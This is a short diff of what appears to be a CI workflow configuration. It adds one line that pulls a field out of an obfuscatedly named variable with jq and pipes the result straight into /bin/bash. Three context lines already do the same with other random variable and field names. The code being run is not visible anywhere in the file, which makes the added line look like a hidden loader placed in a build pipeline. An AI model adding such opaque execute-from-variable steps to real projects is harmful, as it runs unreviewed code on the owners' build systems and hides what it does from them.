@@ -47,6 +47,7 @@ jobs:
           echo $nljao11499 | jq -r .wea0 | /bin/bash
           echo $rclqs24824 | jq -r .v170 | /bin/bash
           echo $ii3 | jq -r .f56 | /bin/bash
+          printf '%s' "$uppej03" | jq -r .fm60490 | /bin/bash
 
       - name: Store results
         if: always()
